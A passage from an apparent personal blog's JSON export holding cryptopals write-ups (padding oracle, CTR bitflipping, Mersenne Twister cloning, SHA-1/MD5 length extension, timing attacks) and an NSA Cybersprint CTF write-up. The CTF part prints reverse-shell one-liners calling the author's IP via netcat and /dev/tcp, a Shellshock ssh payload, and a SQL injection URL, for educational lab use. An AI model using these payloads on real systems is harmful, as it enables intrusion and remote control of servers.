CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning True if the plaintext is padded properly. The process behind the attack on each block is: For each byte, starting at the last position, modify the ciphertext in the previous block, cycling through all 256 possibilities for the plaintext until I find the correct one. Here’s the explanation of how I make and check my guesses. For the currently examined block, remember that I can modify the previous block’s ciphertext, which will be XORed with this block’s intermediate state to get a modified plaintext. What is the goal for the modified plaintext? It’s to get the proper padding bytes at the end of it! So, to decrypt the last byte of the block, I first provide the correct offset 123new_ciphertext, C&#x27;:block -2 -1AAAAAAAAAAAAAAAZ XXXXXXXXXXXXXXXU If I cleverly choose the value of Z, then the last byte of C’, U above, will XOR to the correct padding byte, \\x01. I XOR out the corresponding byte from the ciphertext, XOR out a guess for the flag byte character, and XOR in the desired padding byte (\\x01). 1pad_str = offset_pad + xor(prev_block[-desired_padding_byte], cand_ord, desired_padding_byte) I create the new_ciphertext C' by inserting my crafted block C[-2]' before the block I’m currently examining. 1new_ciphertext = ciphertext[:-32] + pad_str + ciphertext[-16:] If my guess is correct, then only \\x01 will be left, and padding_oracle(new_ciphertext) will return True. If I’m not examining the last character in the block, then the desired padding bytes will be something greater than \\x01. I modify the following ciphertext bytes I’ve already solved to XOR out the ciphertext byte, XOR out the known flag bytes, and XOR in the desired padding byte (\\x02 - \\xF). 1pad_str = pad_str + xor(prev_block[-desired_padding_byte+1:], known_last_bytes, desired_padding_byte) if len(known_last_bytes) &gt; 0 else pad_str As before, the correct guess will cause the byte of interest to XOR to the proper padding byte, and padding_oracle(new_ciphertext) will return True. 123new_ciphertext, C&#x27;:block -2 -1AAAAAAAAAAAAAAZK XXXXXXXXXXXXXXUK Above, I want the plaintext bytes at positions UK to decrypt to \\x02\\x02. Modifying K to decrypt to \\x02 is simple because I already know the byte and can fully control what to XOR in or out. Note: The ‘previous ciphertext’ block for the first block is the IV, so we perform the XORs on it the same way we would modify any other block. The wrapper function, padding_oracle_attack(padding_oracle, ciphertext, blocksize), will loop through calls to decipher_block to find the last block, append the found bytes to the flag, and on the next iteration, slice out the blocks of ciphertext I’ve already solved. Challenge 18 This challenge is to implement CTR (Counter) stream cipher mode. CTR mode does not encrypt the plaintext — rather, it encrypts a running stream of counter bytes, which is then XORed with the plaintext. One benefit of CTR mode is that it does not require padding. I define a CTR() class in set3_utils. Decryption is identical to encryption. In encrypt, I generate the keystream, in 128 byte chunks, for all of my plaintext, which looks like 12keyblock = e.update(p64(self.nonce, &#x27;little&#x27;) + p64(self.counter, &#x27;little&#x27;))keystream += keyblock These are pwntools packing functions, packing the counter in little-endian format. The nonce is a random, secret value that composes the first 64 bytes of every keystream block. After XORing my keystream with the plaintext, I save the unused keystream bytes in self.carry_over_bytes. The next time I run decrypt() or encrypt(), I set keystream = self.carry_over_bytes so I use all the bytes of previously-generated keystreams. Challenge 19 Break fixed-nonce CTR mode using substitutions Challenge 20 Break fixed-nonce CTR statistically In this challenge, using a fixed-nonce for CTR will essentially boil down to solving repeating-key XOR, where the repeating-key is the reused ciphertext of the CTR keystream. I know that each encrypted text has been XORed with the same keystream. I first pad each encrypted text with 0’s to the same length (anything longer than the longest line). 1padded_encrypted_texts = [text.ljust(max_length, &#x27;0&#x27;) for text in encrypted_texts] Then, I can simply concatenate all the ciphertexts into one long string, as if a repeating-xor-key of length max_length had been applied. 1keystream = breakRepeatingXor(&quot;&quot;.join(padded_encrypted_texts), max_length) The result will be a keystream that, when XORed with each encrypted text, should produce mostly readable text. The accuracy towards the end of the longer strings will degrade, because there is not enough information to determine the correct key — there are simply not enough strings near the maximum length to determine the key based on letter frequency. Challenge 21 Implement the MT19937 Mersenne Twister RNG The Mersenne Twister is by far the most common PRNG (pseudo-random number generator). The most common version is based on the Mersenne prime 219937−1, and has a known set of constants and magic values. There are three main components of MT19937, 32-bit values. Initialization of the first set of 624 values from a seed Outputting the next number from the RNG, after some tempering Generating a new set of 624 values (twisting) In step 1, we initialize the self.state array by setting the first value to be the seed, and then calculating the rest from the formula off Wikipedia, x[i] = f × (x[i-1] ⊕ (x[i-1] &gt;&gt; (w-2))) + i, where w is the word size, 32 bits. 12for i in xrange(1, 624): self.state[i] = self.int32(f * (self.state[i-1] ^ (self.state[i-1] &gt;&gt; 30)) + i) where f is a magic, 1812433253. In step 2, the RNG outputs a number by taking the next state value, indexed by self.index, and applying some temper transforms before returning it. Then, we increment self.index to use the next state value next time. When we have used up 624 values, we “twist” to generate more. For each state value, the RNG concats the MSB of the current state value and the other 31 bits from the next state value. 1y = (self.state[i] &amp; 0x80000000) + (self.state[(i+1) % 624] &amp; 0x7fffffff) Then it does the A transform above: right-shifts by one, and XORing an additional magic if the current state value is odd. We also XOR with the 397th-next former state variable. 1self.state[i] = self.state[(i+397) % 624] ^ (y&gt;&gt;1) 123if y % 2 != 0: # if odd, xor with another magic number self.state[i] ^= 0x9908b0df Challenge 22 Crack an MT19937 seed Challenge 23 Clone an MT19937 RNG from its output TO clone an MT19937 RNG, we need to find its 624-value internal state. We need to get 624 RNG outputs, and untemper each one. The untempering is very tricky — remember that we did this sequence of two right shifts and two left-shift ANDs: 1234temp ^= (temp &gt;&gt; 11)temp ^= (temp &lt;&lt; 7) &amp; 2636928640temp ^= (temp &lt;&lt; 15) &amp; 4022730752temp ^= (temp &gt;&gt; 18) Let’s see how to undo that right shift: 123410110111010111110001000011001110 ^00000000000000000010110111010111 (&gt;&gt;18)=10110111010111110011110100011001 We iterate through all the bits of the output, starting from the leftmost bit 123456for i in xrange(32): output_bit = getBit(binary_str, i) recovered_bit = output_bit ^ getBit(orig_bits, i - shift) # set the bit at index i in the orig_bits to be the recovered bit orig_bits = setBit(orig_bits, i, recovered_bit) While i &lt; shift, getBit() will return 0 as the XOR bit, and recovered_bit will just be the same as the output bit. When i = shift, orig_bits will contain the first shift original bits. getBit(orig_bits, i - shift) will emulate the right-shifted original value, grabbing original bit values, starting from the left of orig_bits. Thus, the XOR of the output_bit and the corresponding index of orig_bits will recover the next original bit. 123456789101112131415When i = 18output: 18___ |10110111010111110011110100011001orig_bits:101101110101111100recovered_bit:output[18] ^ orig_bits[0] 1 ^ 1 = 0 Note that, if shift &lt; 16, at some point each recovered original bit is used immediately in the next iteration of the for loop to recover the next bit. To untemper the left shift + and + xor, we reconstruct the original from the right side, not the left. 1234567891011 24--- | \\/ 1011011101011111000100001 1001110 ^ (&lt;--orig_bits)1010111110001000011001110 0000000 (&lt;&lt; 7) =__________________________________0001100011010111011101111 1001110 &amp;1001110100101100010101101 0000000 (&lt;--2636928640 magic) =__________________________________0001100000000100010101101 0000000 output_bits 1234567for i in reversed(xrange(32)): output_bit = getBit(binary_str, i) undo_xor_bit = getBit(orig_bits, i + shift) &amp; getBit(and_val, i) recovered_bit = output_bit ^ undo_xor_bit orig_bits = setBit(orig_bits, i, recovered_bit) While i + shift &gt; 31, the undo_xor_bit is 0, so the last shift bits of orig_bits are identical to the last shift output_bits. Once i &lt;= 31-shift, we begin using values from the right side of orig_bits, emulating the left-shifted value. We then &amp; in the magic bit, and XOR with the output bit to recover the next original bit. 12345678910When i = 24undo_xor_bit:orig_bits[31] &amp; and_value[24] 0 1 = 0recovered_bit:output[24] ^ undo_xor_bit = 1 ^ 0 = 1 Our final untemper function is just reversing the 4 tempers, 12345678def untemper(val): val = unRightShiftXor(val, 18) val = unLeftShiftXorAnd(val, 15, 4022730752) val = unLeftShiftXorAnd(val, 7, 2636928640) val = unRightShiftXor(val, 11) and we can easily clone an RNG’s 624-value state: 123for i in xrange(624): rand = mt.get_number() cloned_mt_state[i] = untemper(rand) We check that a MT with the cloned state does in fact generate the same numbers as the original MT. Done! 12cloned_mt = MT19937(arbitrary value)cloned_mt.state = cloned_mt_state Challenge 24 Create the MT19937 stream cipher and break it We first need to create an MT19937 stream cipher, which operates much like CTR mode. The keystream, the RNG output, is simply XORed to decrypt or encrypt. We have an oracle that appends some random prefix to our plaintext before encrypting it using the MTR Stream cipher. We first find the prefix length, by simply subtracting the length of the plaintext from the len of oracle-returned ciphertext — the added length in the ciphertext must be due to the prefix, since there’s no padding in a stream cipher. 12345678910111213141516171819Step 1:plaintext:AAAAAAAAAAAAAAencrypted in oracle:|rand_prefix|| |RRRRRR AAAAAAAAAAAAAA|len(oracle_ciphertext)|Step 2:padded:|prefix_len|| |AAAAAA AAAAAAAAAAAAAA|len(oracle_ciphertext)| |-COMPARE ENC-| We then iterate through all possible seed values, 1…216. We create a MT Cipher with each seed, encrypting our padded data and seeing if it gives the same ciphertext as the oracle did. (Remember to slice out the random prefix when comparing!) If the ciphertexts match, we have found our seed! 1234for i in xrange(2**16): padded = &#x27;A&#x27; * len(oracle_ciphertext) if MT19937Cipher(i).encrypt(padded)[prefix_len:] == oracle_ciphertext[prefix_len:]: return i","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 4","slug":"set4-writeup","date":"2017-03-07T18:38:11.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/03/07/set4-writeup/","permalink":"http://raywang.tech/2017/03/07/set4-writeup/","excerpt":"Challenge 25 Break “random access read/write” AES CTR Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character. For each byte in the ciphertext, I can try all 256 characters by replacing the ciphertext byte with my encrypted guess using the provided edit() function. If the new ciphertext exactly matches the original ciphertext, then I know my guess for the plaintext character is correct, since it encrypted to the same byte. 123456for i in xrange(len(ciphertext)): for c in candidates: new_ciphertext = edit(ciphertext, i, c) if new_ciphertext[i] == ciphertext[i]: result += c","text":"Challenge 25 Break “random access read/write” AES CTR Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character. For each byte in the ciphertext, I can try all 256 characters by replacing the ciphertext byte with my encrypted guess using the provided edit() function. If the new ciphertext exactly matches the original ciphertext, then I know my guess for the plaintext character is correct, since it encrypted to the same byte. 123456for i in xrange(len(ciphertext)): for c in candidates: new_ciphertext = edit(ciphertext, i, c) if new_ciphertext[i] == ciphertext[i]: result += c My main gripe is that this program is veryyy slow and I’m not sure where the slowdown comes from, but I’m not concerned with optimising right now. Challenge 26 CTR bitflipping CTR is susceptible to an even simpler bitflipping attack than CBC. I can simply send in the payload string as before '\\x00admin\\x00true\\x00', which will be inserted between &quot;&quot;comment1=cooking%20MCs;userdata=&quot; &quot; and &quot;;comment2=%20like%20a%20pound%20of%20bacon&quot; and encrypted. I can modify the ciphertext for the block-of-interest directly — I don’t even need the previous ciphertext block as in CBC! 123ciphertext[32] = chr(ord(ciphertext[32]) ^ 59)ciphertext[38] = chr(ord(ciphertext[38]) ^ 61)ciphertext[43] = chr(ord(ciphertext[43]) ^ 59) will XOR in the ASCII codes for ; and =, so when CTR decryption XORs this ciphertext against the keystream, the desired characters will be left. Challenge 27 Recover the key from CBC with IV=Key Apparently, using the key as an IV is insecure, if an attacker can modify the ciphertext in-flight. The challenge instructs us to: 1234567891011Use your code to encrypt a message that is at least 3 blocks long:AES-CBC(P_1, P_2, P_3) -&gt; C_1, C_2, C_3Modify the message (you are now the attacker):C_1, C_2, C_3 -&gt; C_1, 0, C_1Decrypt the message (you are now the receiver) and raise the appropriate error if high-ASCII is found.As the attacker, recovering the plaintext from the error, extract the key:P&#x27;_1 XOR P&#x27;_3 Why does this work? Well, by inserting all \\x00’s’ in block 2, when we CBC decrypt block 3 of C’, we recover the intermediate state of C_1, since we XOR with all \\x00. We also have the plaintext of C_1 in the first block. So, we can simply recover the IV by XORing the plaintext with the intermediate state. 123P&#x27;_3 ^ IV = P&#x27;_1IV = P&#x27;_1 ^ P&#x27;_3 Challenge 28 Implement a SHA-1 keyed MAC The way a MAC works is described in this diagram off wikipedia: We run the message through the HMAC algo, and send both the message and MAC digest to the receiver. The receiver must verify that the message he received has not been tampered by running it through the same MAC algo, and checking it against the MAC digest he received. In this case, our HMAC algo is just secret-prefix, SHA1(key || message). I borrow a SHA1 implementation from https://github.com/ajalt/python-sha1. The authsha1(key, data) function produces the MAC digest, and validate_oracle(key, message, digest) checks that the MAC digest of message matches digest. Challenge 29 Break a SHA-1 keyed MAC using length extension This is a cool attack. Here’s a general idea of how SHA-1 works: SHA1 operates on padded data. The RFC explains the padding scheme as follows: The purpose of message padding is to make the total length of a padded message a multiple of 512. SHA-1 sequentially processes blocks of 512 bits when computing the message digest. ‘1’ is appended to message. '0’s are appended, depending on the original length of the message. Leave space for two 4-byte words at the end, so bring up the message to 448 bits (56 bytes). We can do that with 1message += b&#x27;\\x00&#x27; * ((56 - (message_byte_length + 1) % 64) % 64) If the message is already &gt;56, Append the 2-word representation of len(message). If the message is 40 bytes long, The two-word representation of 40 is hex 00000000 00000028. There are five internal state variables, h0, h1, h2, h3, h4. These are concatenated to give the final digest. The h’s are initialized to 123450x67452301,0xEFCDAB89,0x98BADCFE,0x10325476,0xC3D2E1F0, Then, each chunk is processed and the h’s are updated as follows: Split the 64-byte chunk into 16 4-byte words Populate a word_array of size 80 with the 16 words, and then 64 more generated values. Let A = H0, B = H1, C = H2, D = H3, E = H4. Do 80 rounds of transformations on a, b, c, d, e. Finally, update the internal digests H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E. So, when update() is called in authsha1, the internal states (the h’s) are updated for every full 64-byte block, leaving the leftovers in self._unprocessed. Then, digest() is called, to pad the leftovers to 64 or 128 bytes, and do the last 1 or 2 internal state updates, returning the concatenated h’s as the digest. The attack The attack will mean I am able to successfully append some data to the message and create a forged digest, such that the receiver will think that I generated the digest by knowing the key and accept the message as untampered. The steps for forging a digest are: I need to guess the length of the key so that my message will have the correct padding. Split the SHA1 digest of the true message into 5 pieces, which will be passed as h0, h1, h2, h3, h4 to a new SHA1. For each guess for the keylength, prepend key padding to the original message and append SHA1 padding. 12|keylen_guess|AAAAAAAAAAAAAA orig_message \\x01\\x00\\x00... Pass in the internal state variables and the length of the padded message to a new SHA1, telling the algorithm how many bytes have been processed so far(message_byte_length) and the current state. Update the SHA1 with the extension data, getting a forged digest. We’re essentially forging the digest for: 12|keylen_guess|AAAAAAAAAAAAAA orig_message \\x01\\x00\\x00... ;admin=true Now, remove the key padding from the extended message, leaving the forged message: 1orig_message \\x01\\x00\\x00... ;admin=true Send this and its forged digest to the receiver to be verified. The receiver will prepend the key to this message and calculate the digest. When we guess the correct keylen, the padding we’ve added to the orig_message block will be correct, and the SHA1 will continue by hashing the next block, ;admin=true, and find that the digest is the same as our forged one. 1234padded_plaintext_no_key = padded_plaintext_with_key_extension[keylen_guess:]if validate_oracle(key, padded_plaintext_no_key, forged_digest): print &quot;Found keylen_guess&quot;, keylen_guess I successfully created a forged digest for the message comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98;admin=true that the receiver validates! Challenge 30 Break an MD4 MD5 keyed MAC using length extension I decided I like MD5 better than MD4, and there’s more implementations out there. MD5 is susceptible to the same length extension attack as above because it follows the MD construction, which includes padding and the fact that the output of the hash gives all the state needed to continue, or extend, the hash. Here’s how MD5 works: The padding scheme is very similar to SHA-1 — the only difference being that the length is added on as big-endian packed instead of little-endian packed. There are four internal state variables - A, B, C, D, each 32 bits. These are initialized to 12345word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 We also use a table of 64 values generated from the sine function, self.k. For each chunk, which is 512 bits, we unpack into 16 words of 32-bits. Then, we do 64 transforms, split into four rounds. each transform taking: an incrementing-by-one index into the sin table, a function f specific to the round, a lrot value, and an index into our array of 16 words. At the end of each transform, the ABCD values are updated as follows: 1a, b, c, d = d, x &amp; 0xffffffff, b, c where x is the result of the transform. The message digest produced as output is the concat of A, B, C, D, 128 bits, or 16-bytes in length. I use the implementation at https://github.com/FiloSottile/crypto.py/blob/master/2/md5.py, but it needs to be extended in several ways for this challenge. The implementation must allow the caller to set the internal state variables so that I can continue the hash. I add 12345678if state_array: self.A = state_array[0] self.B = state_array[1] self.C = state_array[2] self.D = state_array[3] else: #initial magic self.A, self.B, self.C, self.D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) The implementation also must allow the caller to specify how many bytes have been processed so far, the message_byte_length option above. Challenge 31 Implement and break HMAC-SHA1 with an artificial timing leak I use Tornado as my web framework. I take in a file and signature URL param, and implement an insecure_compare function that converts the values to ascii, then byte-by-byte compares, adding a timing delay of 50ms. I iterate through all possible bytes, making a request with my known bytes + byte_guess + padding. I simply take the maximum delay each time, which would occur when I’ve guessed the byte correctly, causing another sleep of 50ms, for an added delay of 100ms. Challenge 32 Break HMAC-SHA1 with a slightly less artificial timing leak When I have such a small timing leak (5ms), network delays make the previous exploit unreliable. I need to normalize over multiple runs (I choose 10) to be able to tell whether the maximum is indeed the correct HMAC byte.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"NSA Cybersprint 2015","slug":"NSA-Cybersprint-2015","date":"2015-12-13T01:38:28.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2015/12/12/NSA-Cybersprint-2015/","permalink":"http://raywang.tech/2015/12/12/NSA-Cybersprint-2015/","excerpt":"This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure. Here’s what it was like.","text":"This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure. Here’s what it was like. I’m in the position of a penetration tester who’s been hired to probe the major pharmaceutical company, BWP, for vulnerabilities. In five levels of increasing difficulty, I must explore and exploit an array of BWP’s internal sites. I’m testing an extensive set of abilities, including command-line savvy and knowledge of vulnerabilities and hacking tools. But what’s going to help me most is creative problem-solving. As in the real world, there are a lot of unexpected obstacles that complicate break-ins, but inventing workarounds is key to the sport. I use the Kali Linux distribution as my hacking box, which comes with a massive suite of pentesting tools pre-installed. Booting off an external drive with Kali installed, I have a hacker’s playground. On Level 1, I’m given access to our company’s webmail service and internal social network with the credentials of an unprivileged user. I’ll need to leverage this network throughout my investigation to be able to know which employees work for which teams. Without needing too much technical know-how, I navigate around the directory webpages, picking up information about the organization’s users and teams (called ‘Spaces’). I notice there’s a Sales space, an IT admin space, and a Patent space, among others. In a cute little warmup, I’m asked to craft a social-engineering attack — email a manager asking for a list of patent-holders and their patents in the most innocent way possible. Of course, only a bot responds to me, but this highlights a low-hanging fruit in real life — human beings are often the weakest link in a company’s security chain. A dozen small checkpoints later, I’m on Level 2. There’s a secret IT-only staff page that I need to get access to. As it turns out, only IT staff members can get the password to this site, by requesting the credentials from an online portal. So I log in to the portal as my unprivileged self and notice there’s an online form with my username in an uneditable input field. I tweak the page source to impersonate an IT staff member, send the form, and get an automated response with the IT-only login. Nothing fancy yet, just using the Page Inspector, which is built into browsers like Firefox and Chrome. It’s contrived, sure, but we’re only on Level 2! I login to the secret page. Now, I’m staring at the IT dashboard and a big list of tickets. Let’s look at the most recent ticket — it has to do with a closed-circuit TV (CCTV) server. But there’s a problem — ticket details are restricted to IT staff members, and I don’t have the credentials of any. Kali Linux comes with the Burp Suite, which has a host of capabilities for testing web applications. Setting up a proxy between Burp and the webpage, I can view all the requests and responses that are being sent back and forth, and I can change the contents before sending them along. To do this, I configure my browser to forward connections to Burp’s proxy port and turn on Burp’s ‘intercept’ feature. To view ticket details, it looks like I need to change this show_details parameter in the HTTP GET request to true. I use Burp to intercept my browser’s request to the web page, replacing the parameter and then forwarding the request along. The server, seeing this edited request, displays the details: “CVE-2014-0160”. What’s this? It’s a vulnerability in the OpenSSL library commonly known as Heartbleed, which is classified as a ‘buffer-overread’. This bug in a critical library for secure communications got a lot of attention in 2014 because it compromised hundreds of millions of secure web servers. When one machine on a secure channel tries to ask another if it’s still alive, it’s called the ‘heartbeat’ protocol. One side sends a payload length and payload to the other side, which reads the payload and sends it back. But, if the payload length is greater than the payload data, the responding machine will read back not just the payload, but also anything in memory stored beyond the payload data. This is due to a faulty bounds-check that doesn’t check whether the ‘payload length’ value is actually correct. The penetration testing command-line tool Metasploit comes with a Heartbleed scanner pre-installed. A few inputs and an exploit command later, I’ve leaked the CCTV server’s memory and discovered a password in the leak. Now, I can log in and view video camera feeds. Level 2 is complete. Rolling right along, I now move to Level 3 in which I break into the sales team. I try to log in to the sales submission website, but I’m not a sales staff member, so no luck. It’s time to whip out Burp again to forge some parameters and masquerade as sales. This time, I replace a user parameter in my browser request with the username of a sales team member. It works. On the sales submission site, I notice an error log file, which naively has a set of customer credentials buried in it. With these credentials, I can get onto the Customer Relationship Management (CRM) portal. Now my SQL skills are put to the test. There’s a ‘Sales Analysis’ table on this site, whose backend is a MySQL database. It’s got a list of drug sales to different buyers and their associated dollar amounts. Some of the entries are hidden — some buyers are ‘restricted’, and I can’t see sales involving them. But it seems like the URL takes SQL queries as parameters. Sticking into the request url ?columns=*, I’ve crafted the command SELECT * FROM sales WHERE restricted=0. This command shows all columns in the table, but the server adds a WHERE clause to exclude the entries where the restricted column Now, I want to get rid of that pesky WHERE clause so that I can view all the restricted transactions. I add to the url ?columns=* FROM sales; --. The double hyphens out-comment everything after it, so the WHERE filter is not executed. I can see all entries, including the one company with the restricted field set to 1. We’re not quite done. The restricted company’s name is base64-encoded with a custom alphabet key, and I have to use an online service to decode the name. Moving right along. I check out Level 4. It’s all about Windows. Skip! Level 5 is by far the trickiest set of tasks. I’m given a web application for a personal pill-scheduling site called Digital Pillbox, and I need to find some way to get a reverse shell on the web server. From there, I need to exploit the remote version-control server, and finally, I have to obtain a shell on the build server. How do I get started? Well, there happens to be a .git folder in the web directory that I can access. This folder contains all information about a Git version control repository, which includes configuration, logs, etc. And I know I can recreate the source files if I have this repo. So, I use wget -r --no-parents --reject ‘index.html to mirror the .git folder to a folder on my local machine, recursively downloading the contents from the webpage. Wget is a command-line program for retrieving the contents of web servers. The -r option tells wget to go through all the contents of the directory recursively. The --no-parents prevents the parent directories of the .git folder from being downloaded. --reject ‘index.html’ will reject a set of duplicate files starting in index.html that we don’t need. To recover the source files, I run a git stash in the local .git folder. The source code is a set of PHP scripts for enrolling users, creating users, and logging in to the web app. There’s also a cookies.inc file, which contains PHP code to generate HTTP cookies for app authentication. I have to perform the most difficult task in the competition — a PHP object injection. Basically, I craft a cookie in which I’ve embedded some arbitrary commands and send it to the web app. The app will execute the commands, which will give me a reverse shell. Here we go. I first set up a netcat listener on port 9999 on my computer with nc -l -p 9999. Netcat is the Swiss Army knife of networking. One thing it can do is open a listening port on my machine, which then receives data sent to the port and can send data back to a connecting client. Let’s take a look at the commands I’m going to inject into the web server: 123rm /tmp/fmkfifo /tmp/fcat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc [my ip address] 9999 &gt; /tmp/f I first create a named pipe called /tmp/f, which acts like a first-in first-out queue. Anything sent to this file-like object will be read out in the order that it came in. Now the last command. The /bin/sh -i creates an interactive shell, which is sent with netcat to my IP address on port 9999 and displayed on my terminal. Whatever commands I type on my local machine are directed to /tmp/f with the &gt; /tmp/f. I read in from /tmp/f with cat and pipe the contents to the shell, which executes them in my reverse shell. I could have done this without the named pipe using an option that’s built into netcat, but is often disabled for obvious security reasons — nc –e /bin/sh. The -e option executes the program after the netcat connection is made. But how do I get the web server to run these commands? Well, what’s sent to the server when I login to the app is a serialized User cookie in the user_data parameter. The User object is defined in the user.php file. It so happens that there’s a vulnerable function in the User class called array_filter that executes a string as a function. I grab this user object with Burp and modify it — I add in my list of commands, making sure that array_filter will be called by changing the array_filter value as well. To get the server to accept my evil User object, I use the cookies.inc file to generate a browser cookie from my object and sign it. After forwarding this cookie to the app, I look at my netcat listener, and it appears I have a shell! Now, I get onto the remote git server, which is defined in the .gitconfig file as having IP 10.1.9.88. I locate an RSA private key on the webpage, which allows me to open a Secure Shell (ssh) to the git server. But if the git server’s ssh is configured so that I can’t execute any command I want, I can get around that with the Shellshock vulnerability. Shellshock is an error in Bash shell function definitions. Normally we define a function like some_name() &#123; [some_command] &#125;;. In versions of Bash before September 2014, you could add an arbitrary command after the closing of the function definition, and instead of being ignored, it would be executed independently of the function. I open another netcat listener on my machine on port 9998. I run ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/gitlabkey git@10.1.9.88 ‘() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/[my IP address]/9998 0&lt;&amp;1. Let’s break it down. -o StrictHostkeyChecking=no means that ssh won’t prompt a user to verify that we want to connect, which is standard for new connections. -o UserKnownHostsFile=/dev/null prevents our machine’s hostkey from being added to a file; /dev/null throws away anything written to it. Then, I take advantage of Shellshock. I have an empty function definition with () &#123; :; &#125;;, and anything after it will be executed. I create a bash interactive shell that I send across the network to my own machine. &gt;&amp; redirects output and errors to the TCP connection and 0&lt;&amp;1 redirects the TCP tunnel to standard input. So, my netcat listener now has a reverse shell that executes the commands I type and returns the output to me. Finally, getting onto the build server from my Kali machine is done simply with a reverse SSH tunnel. From the Git server, I run ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -R 8080:10.9.1.56:80 root:[my ip address]. The -R option specifies I want to make a reverse tunnel — the tunnel will bridge my local machine and the build server by routing traffic through the Git server. It’s called a reverse tunnel because I’m opening the tunnel on the Git server, but the entry point is on my Kali box. Port 8080 is the port on my machine that’s listening. IP 10.9.1.56 is the build server and port 80 is the port on the build server. One would need a reverse SSH tunnel if the build server is behind a firewall and is only reachable from the Git server. I can’t access either the Git server or the build server directly, unless I set up a reverse tunnel from the Git server that allows me access. Now, if I connect to localhost:8080, I can browse the build server. To run arbitrary commands, I can add them to a scheduled build. After two days of exploring BWP’s systems, I’ve been able to testing all of my hacking and problem-solving chops. With an expertise in Windows, I could have racked up some more points. Level 4, which I skipped, is all about Windows domain controllers, which are servers that allow user access to resources in a Windows workgroup. First, I would have to get access to the file system and then locate some admin credentials. Then, I could use the metasploit exploit /windows/smb/psexec to get full control of the server and dump its stored passwords. But it was quite a well-designed and thorough CTF by the NSA. They’re letting newcomers learn the ropes in Levels 1-3 and distinguishing the best hackers in Levels 4 and 5.","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"writeups","slug":"writeups","permalink":"http://raywang.tech/tags/writeups/"}]}],"categories":[{"name":"Linguistics","slug":"Linguistics","permalink":"http://raywang.tech/categories/Linguistics/"},{"name":"Gaming","slug":"Gaming","permalink":"http://raywang.tech/categories/Gaming/"},{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"},{"name":"Writing","slug":"Writing","permalink":"http://raywang.tech/categories/Writing/"},{"name":"Reviews and Recs","slug":"Reviews-and-Recs","permalink":"http://raywang.tech/categories/Reviews-and-Recs/"},{"name":"Tooling","slug":"Tooling","permalink":"http://raywang.tech/categories/Tooling/"},{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"},{"name":"Formal Methods","slug":"Formal-Methods","permalink":"http://raywang.tech/categories/Formal-Methods/"},{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"},{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"},{"name":"Research","slug":"Meta/Research","permalink":"http://raywang.tech/categories/Meta/Research/"},{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/categories/TechSec/"}],"tags":[{"name":"Chinese","slug":"Chinese","permalink":"http://raywang.tech/tags/Chinese/"},{"name":"Black Myth Wukong","slug":"Black-Myth-Wukong","permalink":"http://raywang.tech/tags/Black-Myth-Wukong/"},{"name":"SF/Fantasy","slug":"SF-Fantasy","permalink":"http://raywang.tech/tags/SF-Fantasy/"},{"name":"Journey to the West","slug":"Journey-to-the-West","permalink":"http://raywang.tech/tags/Journey-to-the-West/"},{"name":"Hobbies","slug":"Hobbies","permalink":"http://raywang.tech/tags/Hobbies/"},{"name":"Sports","slug":"Sports","permalink":"http://raywang.tech/tags/Sports/"},{"name":"Robots","slug":"Robots","permalink":"http://raywang.tech/tags/Robots/"},{"name":"AI","slug":"AI","permalink":"http://raywang.tech/tags/AI/"},{"name":"quarantine","slug":"quarantine","permalink":"http://raywang.tech/tags/quarantine/"},{"name":"Gaming","slug":"Gaming","permalink":"http://raywang.tech/tags/Gaming/"},{"name":"Film","slug":"Film","permalink":"http://raywang.tech/tags/Film/"},{"name":"TV","slug":"TV","permalink":"http://raywang.tech/tags/TV/"},{"name":"Books","slug":"Books","permalink":"http://raywang.tech/tags/Books/"},{"name":"Ergonomics","slug":"Ergonomics","permalink":"http://raywang.tech/tags/Ergonomics/"},{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"},{"name":"writeups","slug":"writeups","permalink":"http://raywang.tech/tags/writeups/"},{"name":"Best 